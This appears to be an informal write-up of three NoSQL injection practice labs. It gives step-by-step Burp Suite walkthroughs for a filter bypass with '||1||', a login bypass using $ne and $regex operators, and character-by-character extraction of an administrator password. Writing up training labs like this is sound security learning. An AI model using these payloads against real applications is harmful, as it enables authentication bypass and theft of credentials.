**Step1:**

Click on any categories

**Step2:**

Send the GET filter request to repeater

**Step3:**

Check the injection point using '

Now we use \'

So it is clear that NoSQL vulnerability exist

**Step4:**

Now we inject this payload to view all product '||1||'

And lab is solved

**Step1:**

Login in to your account using wiener:peter

Send the request to POST /login to repeater

**Step2:**

If we use  this payload it show id wiener in response. it is clear that password is not checking
```
{ "username": "wiener",

"password":{

"$ne":""

  }

}
```

**Step3:**

If we replace the above word with admin or administrator it is not showing any redirection

**Step4:**

To find username we using regex with the search that any username having adm in his name
```
{ "username": { "$regex": ".*adm.*" }, "password":{

"$ne":""

  }

}
```

**Step5:**

Now replace name with the response name and modify rquery to

```
{ "username": "adminhcijsjg3", "password":{

"$ne":""

  }

}
```

And open the request in browser it will solve.

Or paste session in inspect -> cookie value and refresh page and click on my-account button.

**Step1:**

First login with given credential

**Step2:**

Send the GET /user/lookup request to  repeater

**Step3:**

When I use ' ' it show error

If we use url encoded `'%2b'`

**Step4:**

Now we find password for administrator user

`administrator' && this.password.length < 30 || '1'=='2`

The result show password is less then 30

After some try I found password is 7 character.

This can be found using number payload in intruder

**Step4:**

To extract password we use

`administrator' && this.password[§0§]=='§a§`

Send the above request to intruder

Attack type: cluster bomb

Payload1 setting

Payload2 setting

**Step5**  
to find password first sord payload1 then sort length

We have password

Knzddwlw
